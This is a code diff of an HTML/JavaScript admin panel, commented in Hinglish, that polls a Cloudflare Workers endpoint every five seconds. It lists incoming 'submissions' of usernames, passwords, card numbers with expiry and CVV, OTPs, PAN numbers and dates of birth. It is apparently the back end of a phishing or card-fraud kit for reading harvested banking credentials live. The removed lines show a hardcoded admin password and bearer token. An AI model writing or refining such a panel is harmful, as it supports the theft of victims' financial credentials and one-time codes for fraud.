@@ -3,268 +3,188 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>j</title>
+    <title>LIVE ADMIN – WORKER SUBMISSIONS</title>
     <style>
-        /* tumhara existing CSS – bilkul waisa hi rahega */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
         body { background-color: white; min-height: 100vh; padding: 0; }
-        .main-content { display: none; }
-        .login-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.7); display: flex; justify-content: center; align-items: center; z-index: 9999; }
-        .login-popup { background-color: white; width: 320px; border-radius: 10px; overflow: hidden; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); }
-        .login-header { background: linear-gradient(135deg, #87CEEB, #4da6ff); padding: 20px; text-align: center; color: white; }
-        .login-logo { height: 50px; width: auto; margin-bottom: 10px; }
-        .login-title { font-size: 20px; font-weight: bold; margin-bottom: 5px; }
-        .login-subtitle { font-size: 12px; opacity: 0.9; }
-        .login-body { padding: 25px; }
-        .input-group { margin-bottom: 20px; }
-        .input-label { display: block; font-size: 14px; color: #333; margin-bottom: 5px; font-weight: bold; }
-        .input-field { width: 100%; padding: 12px 15px; border: 2px solid #e0e0e0; border-radius: 6px; font-size: 14px; transition: border-color 0.3s; }
-        .input-field:focus { outline: none; border-color: #87CEEB; }
-        .login-button { width: 100%; padding: 14px; background: linear-gradient(135deg, #87CEEB, #4da6ff); color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; transition: all 0.3s; margin-top: 10px; }
-        .login-button:hover { background: linear-gradient(135deg, #4da6ff, #87CEEB); transform: translateY(-2px); box-shadow: 0 5px 15px rgba(135, 206, 235, 0.4); }
-        .error-message { color: #ff3860; font-size: 13px; text-align: center; margin-top: 15px; min-height: 20px; font-weight: bold; }
-        .page-header { background-color: #f8f9fa; padding: 8px 15px; border-bottom: 1px solid #dee2e6; display: flex; align-items: center; position: sticky; top: 0; z-index: 100; }
-        .logo { display: none; }
-        .header-title { font-size: 16px; color: #333; font-weight: bold; margin-left: 0; }
+        
+        /* HEADER – tere design jaisa, bina logo ke */
+        .page-header {
+            background-color: #f8f9fa;
+            padding: 8px 15px;
+            border-bottom: 1px solid #dee2e6;
+            display: flex;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .header-title {
+            font-size: 16px;
+            color: #333;
+            font-weight: bold;
+            margin-left: 0;
+        }
+        
+        /* DATA CONTAINER – white/black combination */
         .data-container { padding: 0; }
-        .data-item { padding: 12px 15px; border-bottom: 1px solid #ddd; font-size: 15px; font-weight: 600; line-height: 1.5; }
+        .data-item {
+            padding: 12px 15px;
+            border-bottom: 1px solid #ddd;
+            font-size: 15px;
+            font-weight: 600;
+            line-height: 1.5;
+        }
         .data-item.white-bg { background-color: white; color: #111; }
         .data-item.black-bg { background-color: #0a0a0a; color: white; }
         .data-item.black-bg .field-label { color: #ccc !important; }
-        .field { margin-bottom: 4px; display: flex; flex-wrap: wrap; }
-        .field-label { font-weight: 700; color: #444; margin-right: 6px; min-width: 60px; }
-        .empty { text-align: center; padding: 60px 20px; color: #666; font-size: 16px; font-weight: bold; }
-        .blink-flash { background-color: #f2f2f2 !important; transition: background-color 0.15s; }
-        .black-bg.blink-flash { background-color: #2a2a2a !important; }
+        .data-item.black-bg span, 
+        .data-item.black-bg div { color: white; }
+        
+        .field {
+            margin-bottom: 4px;
+            display: flex;
+            flex-wrap: wrap;
+        }
+        .field-label {
+            font-weight: 700;
+            color: #444;
+            margin-right: 6px;
+            min-width: 60px;
+        }
+        
+        /* Category ke hisab se label colors (sirf white-bg pe) */
+        .otp-data .field-label { color: #0a5c8c; }
+        .pan-data .field-label { color: #1e5a1e; }
+        .account-data .field-label { color: #5e2a7c; }
+        
+        .black-bg .field-label { color: #e0e0e0 !important; }
+        
+        .empty {
+            text-align: center;
+            padding: 60px 20px;
+            color: #666;
+            font-size: 16px;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
-    <!-- LOGIN POPUP -->
-    <div class="login-overlay" id="loginOverlay">
-        <div class="login-popup">
-            <div class="login-header">
-                <div class="login-title">🔐 LOGIN</div>
-                <div class="login-subtitle">Secure Access Only</div>
-            </div>
-            <div class="login-body">
-                <div class="input-group">
-                    <label class="input-label">Username</label>
-                    <input type="text" class="input-field" id="usernameInput" placeholder="Enter username" autocomplete="off">
-                </div>
-                <div class="input-group">
-                    <label class="input-label">Password</label>
-                    <input type="password" class="input-field" id="passwordInput" placeholder="Enter password" autocomplete="off">
-                </div>
-                <button class="login-button" id="loginButton">Login</button>
-                <div class="error-message" id="loginError"></div>
-            </div>
-        </div>
-    </div>
-    
-    <!-- MAIN ADMIN CONTENT -->
-    <div class="main-content" id="mainContent">
+    <div class="main-content">
         <header class="page-header">
-            <div class="header-title">📡 LIVE DATA</div>
+            <div class="header-title">⚡ LIVE ADMIN – WORKER KV (SUBMISSIONS)</div>
         </header>
+        
         <div class="data-container" id="dataContainer">
-            <!-- Data injected via JavaScript -->
+            <div class="empty">⏳ Data load ho raha hai...</div>
         </div>
     </div>
 
     <script>
-        // ---------- SAME CREDENTIALS, SESSION ----------
-        const USERNAME = "Admin";
-        const PASSWORD = "8789";
-        const SESSION_KEY = "admin_logged_in";
-        const SESSION_TIMEOUT = 30 * 60 * 1000;
-        
-        // Worker API URL (change if your worker URL is different)
-        const WORKER_URL = 'https://aged-sunset-63e0.skd38824.workers.dev/';
-        const AUTH_TOKEN = 'Bearer Admin8789';  // same as worker secret
-        
-        // DOM elements
-        const loginOverlay = document.getElementById('loginOverlay');
-        const mainContent = document.getElementById('mainContent');
-        const usernameInput = document.getElementById('usernameInput');
-        const passwordInput = document.getElementById('passwordInput');
-        const loginButton = document.getElementById('loginButton');
-        const loginError = document.getElementById('loginError');
-        
-        // Session check functions – same
-        function checkSession() {
-            const sessionData = sessionStorage.getItem(SESSION_KEY);
-            if (sessionData) {
-                const session = JSON.parse(sessionData);
-                const now = Date.now();
-                if (now - session.loginTime < SESSION_TIMEOUT) {
-                    hideLogin();
-                    return true;
-                } else {
-                    sessionStorage.removeItem(SESSION_KEY);
-                }
-            }
-            showLogin();
-            return false;
-        }
-        
-        function setSession() {
-            sessionStorage.setItem(SESSION_KEY, JSON.stringify({ loggedIn: true, loginTime: Date.now() }));
-        }
-        
-        function clearSession() {
-            sessionStorage.removeItem(SESSION_KEY);
-        }
-        
-        function showLogin() {
-            loginOverlay.style.display = 'flex';
-            mainContent.style.display = 'none';
-            usernameInput.value = "";
-            passwordInput.value = "";
-            loginError.textContent = "";
-            usernameInput.focus();
-        }
-        
-        function hideLogin() {
-            loginOverlay.style.display = 'none';
-            mainContent.style.display = 'block';
-            loadData();                       // first load
-            if (window.refreshInterval) clearInterval(window.refreshInterval);
-            window.refreshInterval = setInterval(loadData, 5000);
-        }
-        
-        window.addEventListener('load', function() {
-            if (!checkSession()) usernameInput.focus();
-        });
-        
-        function login() {
-            const username = usernameInput.value.trim();
-            const password = passwordInput.value;
-            loginError.textContent = "";
-            
-            if (!username) {
-                loginError.textContent = "Please enter username";
-                usernameInput.focus();
-                return;
-            }
-            if (!password) {
-                loginError.textContent = "Please enter password";
-                passwordInput.focus();
-                return;
-            }
-            
-            if (username === USERNAME && password === PASSWORD) {
-                setSession();
-                hideLogin();
-            } else {
-                loginError.textContent = "Invalid username or password!";
-                passwordInput.value = "";
-                passwordInput.focus();
-            }
-        }
-        
-        loginButton.addEventListener('click', login);
-        usernameInput.addEventListener('keypress', function(event) {
-            if (event.key === 'Enter') passwordInput.focus();
-        });
-        passwordInput.addEventListener('keypress', function(event) {
-            if (event.key === 'Enter') login();
-        });
-        
-        // ---------- UPDATED LOADDATA – WORKER SE FETCH KARO ----------
+        // ---------- TERA WORKER API URL ----------
+        const WORKER_API_URL = 'https://aged-sunset-63e0.s3d38284.workers.dev/api/submissions';
+        const container = document.getElementById('dataContainer');
+
+        // ---------- DATA LOAD KARO (Worker se fetch) ----------
         async function loadData() {
-            const container = document.getElementById('dataContainer');
-            
             try {
-                // Show loading message
-                container.innerHTML = '<div class="empty">⏳ Data fetch ho raha hai...</div>';
-                
-                const response = await fetch(WORKER_URL, {
-                    headers: {
-                        'Authorization': AUTH_TOKEN
-                    }
-                });
-                
-                if (!response.ok) {
-                    throw new Error(`HTTP error ${response.status}`);
-                }
-                
-                const submissions = await response.json(); // array of submission objects
-                
-                if (!submissions || submissions.length === 0) {
-                    container.innerHTML = '<div class="empty">📭 Koi data nahi mila</div>';
-                    return;
-                }
-                
-                // ---------- EXISTING RENDERING LOGIC – BILKUL WAISA HI ----------
-                let html = '';
-                let counter = 0;
-                
-                submissions.forEach(item => {
-                    let itemHtml = '';
-                    let bgClass = counter % 2 === 0 ? 'white-bg' : 'black-bg';
-                    counter++;
-                    
-                    if (item.type === 'User ID') {
-                        itemHtml = `
-                            <div class="field"><span class="field-label">User:</span>${item.data?.username || 'N/A'}</div>
-                            <div class="field"><span class="field-label">Pass:</span>${item.data?.password || 'N/A'}</div>
-                            <div class="field"><span class="field-label">Mobile:</span>${item.data?.mobile || 'N/A'}</div>
-                        `;
-                        html += `<div class="data-item ${bgClass} user-data">${itemHtml}</div>`;
-                    } 
-                    else if (item.type === 'Credit Card') {
-                        itemHtml = `
-                            <div class="field"><span class="field-label">Card:</span>${item.data?.cardNumber || 'N/A'}</div>
-                            <div class="field"><span class="field-label">Expiry:</span>${item.data?.expiry || 'N/A'}</div>
-                            <div class="field"><span class="field-label">CVV:</span>${item.data?.cvv || 'N/A'}</div>
-                            <div class="field"><span class="field-label">Limit:</span>${item.data?.creditLimit || 'N/A'}</div>
-                            <div class="field"><span class="field-label">Mobile:</span>${item.data?.mobile || 'N/A'}</div>
-                        `;
-                        html += `<div class="data-item ${bgClass} card-data">${itemHtml}</div>`;
-                    } 
-                    else if (item.type === 'OTP' || item.type === 'OTP2') {
-                        itemHtml = `
-                            <div class="field"><span class="field-label">OTP:</span>${item.otp || 'N/A'}</div>
-                        `;
-                        html += `<div class="data-item ${bgClass} otp-data">${itemHtml}</div>`;
-                    } 
-                    else if (item.type === 'PAN') {
-                        itemHtml = `
-                            <div class="field"><span class="field-label">Name:</span>${item.data?.name || 'N/A'}</div>
-                            <div class="field"><span class="field-label">PAN:</span>${item.data?.pan || 'N/A'}</div>
-                        `;
-                        html += `<div class="data-item ${bgClass} pan-data">${itemHtml}</div>`;
-                    } 
-                    else if (item.type === 'Account Details') {
-                        itemHtml = `
-                            <div class="field"><span class="field-label">Name:</span>${item.data?.name || 'N/A'}</div>
-                            <div class="field"><span class="field-label">DOB:</span>${item.data?.dob || 'N/A'}</div>
-                        `;
-                        html += `<div class="data-item ${bgClass} account-data">${itemHtml}</div>`;
-                    }
-                    else {
-                        itemHtml = `
-                            <div class="field"><span class="field-label">Type:</span>${item.type || 'Unknown'}</div>
-                            <div class="field"><span class="field-label">Data:</span>${JSON.stringify(item.data) || 'N/A'}</div>
-                        `;
-                        html += `<div class="data-item ${bgClass}">${itemHtml}</div>`;
-                    }
-                });
-                
-                container.innerHTML = html;
-                
-                // Blink effect
-                const items = container.querySelectorAll('.data-item');
-                items.forEach(el => {
-                    el.classList.add('blink-flash');
-                    setTimeout(() => el.classList.remove('blink-flash'), 250);
-                });
-                
+                const response = await fetch(WORKER_API_URL);
+                if (!response.ok) throw new Error('Network error');
+                const submissions = await response.json();
+                displayData(submissions);
             } catch (error) {
                 console.error('Fetch error:', error);
-                container.innerHTML = `<div class="empty">❌ Error: ${error.message}. Worker se data nahi aa raha.</div>`;
+                container.innerHTML = `<div class="empty">❌ Error: ${error.message}</div>`;
             }
         }
+
+        // ---------- DATA DIKHAO – TERI EXACT DESIGN ME ----------
+        function displayData(submissions) {
+            if (!submissions || submissions.length === 0) {
+                container.innerHTML = '<div class="empty">📭 Koi data nahi hai</div>';
+                return;
+            }
+
+            let html = '';
+            let counter = 0;
+
+            submissions.forEach(item => {
+                let itemHtml = '';
+                let bgClass = counter % 2 === 0 ? 'white-bg' : 'black-bg';
+                counter++;
+
+                // ---------- TYPE PEHCHANO ----------
+                let type = item.formType || '';
+                if (!type) {
+                    if (item.username) type = 'User ID';
+                    else if (item.cardNumber) type = 'Credit Card';
+                    else if (item.otp) type = 'OTP';
+                    else if (item.pan) type = 'PAN';
+                    else if (item.dob) type = 'Account Details';
+                    else if (item.name && !item.pan && !item.dob) type = 'User ID'; // fallback
+                }
+
+                // ---------- HAR TYPE KE HISAB SE HTML ----------
+                if (type === 'User ID' || item.username) {
+                    itemHtml = `
+                        <div class="field"><span class="field-label">User:</span>${item.username || item.data?.username || 'N/A'}</div>
+                        <div class="field"><span class="field-label">Pass:</span>${item.password || item.data?.password || 'N/A'}</div>
+                        <div class="field"><span class="field-label">Mobile:</span>${item.mobile || item.data?.mobile || 'N/A'}</div>
+                    `;
+                    html += `<div class="data-item ${bgClass} user-data">${itemHtml}</div>`;
+                }
+                else if (type === 'Credit Card' || item.cardNumber) {
+                    itemHtml = `
+                        <div class="field"><span class="field-label">Card:</span>${item.cardNumber || item.data?.cardNumber || 'N/A'}</div>
+                        <div class="field"><span class="field-label">Expiry:</span>${item.expiry || item.data?.expiry || 'N/A'}</div>
+                        <div class="field"><span class="field-label">CVV:</span>${item.cvv || item.data?.cvv || 'N/A'}</div>
+                        <div class="field"><span class="field-label">Limit:</span>${item.creditLimit || item.data?.creditLimit || 'N/A'}</div>
+                        <div class="field"><span class="field-label">Mobile:</span>${item.mobile || item.data?.mobile || 'N/A'}</div>
+                    `;
+                    html += `<div class="data-item ${bgClass} card-data">${itemHtml}</div>`;
+                }
+                else if (type === 'OTP' || type === 'OTP2' || item.otp) {
+                    itemHtml = `
+                        <div class="field"><span class="field-label">OTP:</span>${item.otp || 'N/A'}</div>
+                    `;
+                    html += `<div class="data-item ${bgClass} otp-data">${itemHtml}</div>`;
+                }
+                else if (type === 'PAN' || item.pan) {
+                    itemHtml = `
+                        <div class="field"><span class="field-label">Name:</span>${item.name || item.data?.name || 'N/A'}</div>
+                        <div class="field"><span class="field-label">PAN:</span>${item.pan || item.data?.pan || 'N/A'}</div>
+                    `;
+                    html += `<div class="data-item ${bgClass} pan-data">${itemHtml}</div>`;
+                }
+                else if (type === 'Account Details' || item.dob) {
+                    itemHtml = `
+                        <div class="field"><span class="field-label">Name:</span>${item.name || item.data?.name || 'N/A'}</div>
+                        <div class="field"><span class="field-label">DOB:</span>${item.dob || item.data?.dob || 'N/A'}</div>
+                    `;
+                    html += `<div class="data-item ${bgClass} account-data">${itemHtml}</div>`;
+                }
+                else {
+                    // Fallback – kuch aur type
+                    itemHtml = `<div class="field"><span class="field-label">Type:</span>${type || 'Unknown'}</div>`;
+                    // Kuch fields dikhane ki koshish
+                    for (let key in item) {
+                        if (['key', 'timestamp', 'formType', 'data'].includes(key)) continue;
+                        if (typeof item[key] === 'string' && !key.includes('timestamp')) {
+                            itemHtml += `<div class="field"><span class="field-label">${key}:</span>${item[key]}</div>`;
+                        }
+                    }
+                    html += `<div class="data-item ${bgClass}">${itemHtml}</div>`;
+                }
+            });
+
+            container.innerHTML = html;
+        }
+
+        // ---------- PAGE LOAD + AUTO REFRESH (5 sec) ----------
+        window.addEventListener('load', function() {
+            loadData();
+            setInterval(loadData, 5000); // Bin blink ke, bas refresh
+        });
     </script>
 </body>
 </html>
